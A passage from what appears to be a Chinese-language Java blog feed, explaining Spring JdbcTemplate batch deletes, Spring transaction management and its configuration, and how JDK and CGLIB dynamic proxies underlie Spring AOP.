class="line">    Object[] objs = &#123;accountId&#125;;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>批量删除账户信息，返回更新的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteAccountBatch</span><span class="params">(Integer[] ids)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from tb_account where account_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            ps.setInt(<span class="number">1</span>, ids[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ids.length;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><be/><h1 id="SpringFramework框架-事务控制"><a href="#SpringFramework框架-事务控制" class="headerlink" title="SpringFramework框架-事务控制"></a>SpringFramework框架-事务控制</h1><p>Spring事务管理让多个数据库操作要么全部成功要么全部失败，通过@Transactional注解自动处理事务开始、提交和回滚，确保数据一致性，避免手动管理事务的繁琐代码</p><h3 id="事务的特性"><a href="#事务的特性" class="headerlink" title="事务的特性"></a>事务的特性</h3><p><strong>原子性（Atomicity）</strong></p><p>要么全部成功，要么全部失败</p><p><strong>一致性（Consistency）</strong></p><p>事务在执行前后，数据库中数据要保持一致性状态。（如转账的过程 账户操作后数据必须保持一致）</p><p><strong>隔离性（Isolation）</strong></p><p>事务与事务之间的执行应当是相互隔离互不影响的。（多个角色对同一记录进行操作必须保证没有任何干扰），当然没有影响是不可能的，为了让影响级别降到最低，通过隔离级别加以限制：</p><table><thead><tr><th align="left">隔离级别</th><th align="left">英文名称</th><th align="left">脏读</th><th align="left">不可重复读</th><th align="left">幻读</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">读未提交</td><td align="left"><code>READ_UNCOMMITTED</code></td><td align="left">✓</td><td align="left">✓</td><td align="left">✓</td><td align="left">隔离级别最低，会引发脏读、不可重复读和幻读问题</td></tr><tr><td align="left">读已提交</td><td align="left"><code>READ_COMMITTED</code></td><td align="left">✗</td><td align="left">✓</td><td align="left">✓</td><td align="left">只能读取已提交的数据，避免了脏读，但仍有不可重复读和幻读问题</td></tr><tr><td align="left">可重复读</td><td align="left"><code>REPEATABLE_READ</code></td><td align="left">✗</td><td align="left">✗</td><td align="left">✓</td><td align="left">确保同一事务中多次读取同一数据结果一致，避免了脏读和不可重复读，但仍存在幻读问题</td></tr><tr><td align="left">串行化</td><td align="left"><code>SERIALIZABLE</code></td><td align="left">✗</td><td align="left">✗</td><td align="left">✗</td><td align="left">最严格的隔离级别，事务串行执行，完全避免脏读、不可重复读和幻读问题，但性能最低</td></tr></tbody></table><p><strong>持久性（Durability）</strong></p><p>事务提交完毕后，数据库中的数据变更是永久的</p><h3 id="事务接口"><a href="#事务接口" class="headerlink" title="事务接口"></a>事务接口</h3><p>Spring事务管理器的接口是<code>org.springframework.transaction.PlatformTransactionManager</code>，该接口提供入下方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PlatformTransactionManager</span> <span class="keyword">extends</span> <span class="title class_">TransactionManager</span> &#123;</span><br><span class="line">    TransactionStatus <span class="title function_">getTransaction</span><span class="params">(<span class="meta">@Nullable</span> TransactionDefinition definition)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rollback</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>JDBC事务管理</strong></p><p>当应用程序直接使用 JDBC 进行数据持久化时，Spring 通过 <code>DataSourceTransactionManager</code> 来管理事务边界。配置方式如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>DataSourceTransactionManager</code> 通过从 <code>DataSource</code> 获取 <code>java.sql.Connection</code> 对象来管理事务，事务提交时调用 <code>Connection.commit()</code> 方法，事务回滚时调用 <code>Connection.rollback()</code> 方法</p><p><strong>Hibernate 事务管理</strong></p><p>当应用程序使用 Hibernate 作为持久化框架时，Spring 通过 <code>HibernateTransactionManager</code> 来管理事务。对于 Hibernate 3，配置如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.orm.hibernate3.HibernateTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sessionFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sessionFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>HibernateTransactionManager</code> 需要注入 Hibernate 的 <code>SessionFactory</code>，该管理器将事务管理职责委托给 Hibernate 的 <code>org.hibernate.Transaction</code> 对象，<code>Transaction</code> 对象从 Hibernate <code>Session</code> 中获取，事务成功完成时调用 <code>Transaction.commit()</code> 方法，事务失败时调用 <code>Transaction.rollback()</code> 方法</p><p><strong>JPA（Java持久化API）事务管理</strong></p><p>当应用程序使用 JPA 作为持久化标准时，Spring 通过 <code>JpaTransactionManager</code> 来管理事务。配置方式如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.orm.jpa.JpaTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;entityManagerFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;entityManagerFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>JpaTransactionManager</code> 需要装配一个 JPA 实体管理工厂（<code>javax.persistence.EntityManagerFactory</code> 的实现），该管理器与 JPA <code>EntityManager</code> 协作来构建和管理事务，通过 <code>EntityManagerFactory</code> 获取 <code>EntityManager</code>，并在其基础上进行事务控制</p><p><strong>JTA（Java事务API）事务管理</strong></p><p>当应用程序涉及分布式事务或多个事务资源（如多个不同数据源）时，Spring 通过 <code>JtaTransactionManager</code> 来管理事务。配置方式如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;transactionManagerName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java:/TransactionManager&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>JtaTransactionManager</code> 将事务管理职责委托给 Java 事务 API（JTA），具体委托给 <code>javax.transaction.UserTransaction</code> 和 <code>javax.transaction.TransactionManager</code> 对象，事务成功时调用 <code>UserTransaction.commit()</code> 方法提交，事务失败时调用 <code>UserTransaction.rollback()</code> 方法回滚</p><h3 id="XML配置文件实现事务管理"><a href="#XML配置文件实现事务管理" class="headerlink" title="XML配置文件实现事务管理"></a>XML配置文件实现事务管理</h3><p><strong>添加命名空间</strong></p><p>事务命名空间</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/tx</span><br><span class="line">http://www.springframework.org/schema/tx/spring-tx.xsd</span><br></pre></td></tr></table></figure><p>AOP命名空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/aop</span><br><span class="line">http://www.springframework.org/schema/aop/spring-aop.xsd</span><br></pre></td></tr></table></figure><p><strong>设置AOP代理</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspect-autoproxy</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配置事务管理器</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;txManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配置通知</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;txManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 对以add update delete query开头的所有方法进行事务处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义什么方法需要使用事务 name代表的是方法名（或方法匹配） --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 匹配以 add 开头的所有方法均加入事务 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;add*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 匹配以 update 开头的所有方法均加入事务 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 匹配以 delete 开头的所有方法均加入事务 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 匹配以 query 开头的所有方法均加入事务 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;query*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><p>属性含义与可选值</p><table><thead><tr><th align="left">属性名</th><th align="left">是否必须</th><th align="left">默认值</th><th align="left">可选值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>name</strong></td><td align="left">必须</td><td align="left">无</td><td align="left">方法名&#x2F;通配符</td><td align="left">与事务关联的方法名，支持通配符：<br /><code>*</code> - 匹配所有方法 <br /><code>get*</code> - 匹配以”get”开头的方法<br /> <code>handle*</code> - 匹配以”handle”开头的方法<br /><code>on*Event</code> - 匹配如”onClickEvent”等方法</td></tr><tr><td align="left"><strong>propagation</strong></td><td align="left">可选</td><td align="left">REQUIRED</td><td align="left"><strong>REQUIRED</strong> - 支持当前事务，如果不存在则创建新事务<br /> <strong>SUPPORTS</strong> - 支持当前事务，如果不存在则以非事务方式执行<br /> <strong>MANDATORY</strong> - 支持当前事务，如果不存在则抛出异常 <br /><strong>REQUIRES_NEW</strong> - 创建新事务，如果存在当前事务则挂起 <br /><strong>NOT_SUPPORTED</strong> - 以非事务方式执行，如果存在当前事务则挂起 <br /><strong>NEVER</strong> - 以非事务方式执行，如果存在事务则抛出异常 <br /><strong>NESTED</strong> - 如果当前存在事务，则在嵌套事务内执行</td><td align="left">事务传播行为，控制方法如何参与事务</td></tr><tr><td align="left"><strong>isolation</strong></td><td align="left">可选</td><td align="left">DEFAULT</td><td align="left"><strong>DEFAULT</strong> - 使用数据库默认隔离级别<br /> <strong>READ_UNCOMMITTED</strong> - 读未提交 <br /><strong>READ_COMMITTED</strong> - 读已提交 <br /><strong>REPEATABLE_READ</strong> - 可重复读 <br /><strong>SERIALIZABLE</strong> - 串行化</td><td align="left">事务隔离级别，控制事务并发访问的隔离程度</td></tr><tr><td align="left"><strong>timeout</strong></td><td align="left">可选</td><td align="left">-1</td><td align="left">正整数（秒）</td><td align="left">事务超时时间： <br /> <code>-1</code> - 永不超时 <br /><code>30</code> - 30秒后超时回滚 <br /><code>60</code> - 60秒后超时回滚</td></tr><tr><td align="left"><strong>read-only</strong></td><td align="left">可选</td><td align="left">false</td><td align="left"><strong>true</strong> - 只读事务<br /> <strong>false</strong> - 读写事务</td><td align="left">事务是否只读，只读事务可进行查询优化</td></tr><tr><td align="left"><strong>rollback-for</strong></td><td align="left">可选</td><td align="left">无</td><td align="left">异常类全限定名（逗号分隔）</td><td align="left">指定哪些异常触发回滚：<br /> <code>java.lang.Exception</code> - 所有Exception<br /><code>com.example.BusinessException</code> - 特定业务异常，默认回滚<code>RuntimeException</code>和<code>Error</code></td></tr><tr><td align="left"><strong>no-rollback-for</strong></td><td align="left">可选</td><td align="left">无</td><td align="left">异常类全限定名（逗号分隔）</td><td align="left">指定哪些异常不触发回滚：<br /><code>java.sql.SQLException</code> - SQL异常不触发回滚<br /><code>com.example.NoRollbackException</code> - 特定不回滚异常</td></tr></tbody></table><p><strong>配置AOP</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置切入点：定义需要被拦截的方法 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.xxxx.service..*.*(..))&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cut&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置通知：将事务通知应用到切入点 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;cut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>初现端倪了，这仔细一看还是AOP动态代理那一块</p><h3 id="注解实现事务管理"><a href="#注解实现事务管理" class="headerlink" title="注解实现事务管理"></a>注解实现事务管理</h3><p><strong>配置事务管理器</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;txManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配置注解支持</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;txManger&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>添加事务注解</strong></p><p>在需要配置事务管理的方法上加入事务注解</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional(propagation=Propagation.REQUIRED)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">(String userName, String userPwd)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Transactional</code>注解具有XML配置中列举的所有属性，可以根据需求自己配置</p><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFramework框架-AOP与Task</title>
      <link href="/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-AOP%E4%B8%8ETask/"/>
      <url>/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-AOP%E4%B8%8ETask/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringFramework框架-AOP"><a href="#SpringFramework框架-AOP" class="headerlink" title="SpringFramework框架-AOP"></a>SpringFramework框架-AOP</h1><p>AOP（面向切面编程）是一种编程范式，通过分离横切关注点来提升代码模块化，其核心机制基于动态代理，在运行时将切面逻辑织入目标方法的连接点，实现非侵入式的功能增强</p><br/><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>静态代理的实现方式先前已有涉及且较容易理解，此处我会补充一些动态代理的内容 。静态代理的目标对象在程序运行前就已经确定，而动态代理的目标对象在程序运行时创建且目标对象不固定</p><br/><h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><h3 id="newProxyInstance-方法"><a href="#newProxyInstance-方法" class="headerlink" title="newProxyInstance()方法"></a><code>newProxyInstance()</code>方法</h3><p><code>newProxyInstance()</code>方法是<code>Proxy</code>类下的方法，该类是完成代理的操作类，可以通过此方法为一个或多个接口动态生成实现类，该方法接受三个参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span><br></pre></td></tr></table></figure><p><code>loader</code>：一个<code>ClassLoader</code>对象，用于定义和加载动态生成的代理类，通常使用与目标接口相同的类加载器</p><p><code>interfaces</code>：一个<code>Interface</code>对象的数组，表示代理对象需要实现的接口，从而可以响应接口中定义的方法调用</p><p><code>h</code>：一个<code>InvocationHandler</code>接口的实现类，作为代理对象的调用处理程序。对代理对象调用方法时，将对方法调用进行编码并将其转发到它的调用处理程序的<code>invoke()</code>方法</p><h3 id="invoke-方法"><a href="#invoke-方法" class="headerlink" title="invoke()方法"></a><code>invoke()</code>方法</h3><p>invoke()方法存在于<code>InvocationHandler</code>接口的实现类，其接受三个参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br></pre></td></tr></table></figure><p><code>proxy</code>：调用该方法的代理对象</p><p><code>method</code>：要调用的目标对象的方法</p><p><code>args</code>：要调用的方法的参数</p><p>在<code>invoke()</code>方法中可以对目标对象的行为进行增强，但一般都会回到<code>method.invoke(target,args)</code>，容易看出动态代理和静态代理的很大不同在于动态代理的代理对象在运行时被需要时才被创建，而且代理对象不直接调用目标对象，而是将调用请求转发给处理程序进行处理，此时处理程序可以对目标对象的行为进行增强</p><h3 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h3><p>执行<code>newProxyInstance()</code>方法时，程序会在运行时创建一个缓存类<code>$Proxy0</code>，该类继承于<code>Proxy</code>，也是客户端实际上操作的对象，当对<code>$Proxy0</code>对象调用接口声明的方法时，会回调父类的<code>h</code>属性的<code>invoke()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> InvocationHandler h;</span><br></pre></td></tr></table></figure><p>该属性在执行<code>newProxyInstance()</code>方法时被赋为传入的<code>InvocationHandler</code>实现类也就是<code>handler</code>，所以调用了<code>handler</code>的<code>invoke()</code>方法，实现了转发</p><p><code>$Proxy0</code>大概长这样，<code>test()</code>是接口定义的方法，<code>this</code>是代理对象本身，呼应了重写<code>invoke()</code>时第一个参数<code>proxy</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, (Object[])<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var2;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写的<code>invoke()</code>的返回值承接了原始对象调用方法后的返回值</p><br/><h2 id="CGLIB动态代理"><a href="#CGLIB动态代理" class="headerlink" title="CGLIB动态代理"></a>CGLIB动态代理</h2><p>JDK动态代理要求目标类需实现某些接口，CGLIB代理不依赖接口进行代理而依赖继承机制实现，通过生成一个目标类的子类并覆盖需要代理的方法实现增强，<code>final</code>修饰的类不能通过CBLIB代理</p><h3 id="方法拦截器"><a href="#方法拦截器" class="headerlink" title="方法拦截器"></a>方法拦截器</h3><p>CGLIB动态代理中的方法拦截器类似于JDK动态代理中的<code>InvocationHandler</code>处理器，其作用是在调用目标类方法时对目标类的行为进行增强，方法拦截器需要实现<code>MethodInterceptor</code>该接口定义了一个<code>intercept()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object <span class="title function_">intercept</span><span class="params">(Object obj, Method method, Object[] args, MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure><p>该方法接受四个参数，<code>obj</code>指向要代理的目标对象，<code>method</code>指向被拦截的方法，<code>args</code>指向被拦截方法的参数，<code>proxy</code>为方法代理，用于调用父类方法</p><p>该方法使用<code>invokeSupera()</code>达到对目标对象的调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, Method method, Object[] args, MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//前置增强方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proxy.invokeSuper(obj, args);</span><br><span class="line">        <span class="comment">//后置增强方法</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Enhancer-增强器"><a href="#Enhancer-增强器" class="headerlink" title="Enhancer ( 增强器 )"></a>Enhancer ( 增强器 )</h3><p>增强器用来动态生成子类代理对象，类似JDK代理创建缓存对象的过程，在创建代理对象前要先对<code>Enhancer</code>对象调用<code>setSupoerclass()</code>方法设置父类（目标类），调用<code>setCallback()</code>方法设置拦截器后才能使用<code>create()</code>方法生成代理对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">enhancer.setSuperclass(Test.class);</span><br><span class="line">enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">NewInterceptor</span>());</span><br><span class="line"><span class="type">Test</span> <span class="variable">proxy</span> <span class="operator">=</span> (Test) enhancer.create();</span><br><span class="line">proxy.test();</span><br></pre></td></tr></table></figure><h3 id="底层实现-1"><a href="#底层实现-1" class="headerlink" title="底层实现"></a>底层实现</h3><p>我们测试一个无参<code>test()</code>方法，执行 <code>Enhancer.create()</code> 方法时，程序会在运行时生成一个继承于目标类的缓存类 <code>TestBean$$EnhancerByCGLIB$$5a33a704</code>，该类是被代理类的子类，也是客户端实际上操作的对象。当对代理对象调用方法时，会回调设置的方法拦截器 <code>MethodInterceptor</code> 的 <code>intercept()</code> 方法，要调用的方法和参数都被转发给了<code>intercept()</code> 方法，生成的缓存子类对应的方法类似如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MethodInterceptor</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.CGLIB$CALLBACK_0;</span><br><span class="line">        <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;</span><br><span class="line">            CGLIB$BIND_CALLBACKS(<span class="built_in">this</span>);</span><br><span class="line">            var10000 = <span class="built_in">this</span>.CGLIB$CALLBACK_0;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (var10000 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var10000.intercept(<span class="built_in">this</span>,CGLIB$methodProxy$<span class="number">0.</span>getMethod(),<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>],CGLIB$methodProxy$<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.methodName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>回调<code>intercept()</code>时传递的参数</p><p><img src="/img/post/image-20251226205329508.png" alt="image-20251226205329508"></p><p>进入<code>invokeSuper()</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeSuper</span><span class="params">(Object obj, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.init();</span><br><span class="line">            <span class="type">FastClassInfo</span> <span class="variable">fci</span> <span class="operator">=</span> <span class="built_in">this</span>.fastClassInfo;</span><br><span class="line">            <span class="keyword">return</span> fci.f2.invoke(fci.i2, obj, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>this.fastClassInfo</code>就是传入的<code>MethodPeoxy</code>形参字段，它的两个字段<code>f1</code>和<code>f2</code>分别储存了目标类对象和代理缓存子类，它们都是<code>FastClass</code>类型，其存在是CGLIB为了避免反射调用，进行缓存直接调用以提高性能</p><p><img src="/img/post/image-20251226212839853.png" alt="image-20251226212839853"></p><p>所以我的环境下所以最后执行的实际是</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bean.TestBean$$EnhancerByCGLIB$$5a33a704.invoke(<span class="number">16</span>, Bean.TestBean$$EnhancerByCGLIB$$5a33a704, <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p><code>FastClass</code>类的<code>invoke()</code>方法与正常的不一样，这里调用了自己的一个编号为<code>16</code>的方法，对应的可能是<code>CGLIB$test$0()</code>这样格式的方法，该方法就是直接调用父类也就是目标对象的方法，完成了闭环</p><p>总的来说，代理对象调用方法时，会先回调拦截器，进行行为增强，然后再回到缓存子类直接调用父类的方法去调用目标方法</p><br/><h2 id="AOP基本概念"><a href="#AOP基本概念" class="headerlink" title="AOP基本概念"></a>AOP基本概念</h2><p><strong>Joinpoint（连接点）</strong></p><p>被拦截到的每个点，spring中指被拦截到的每一个方法，spring aop一个连接点即代表一个方法的执行</p><p> 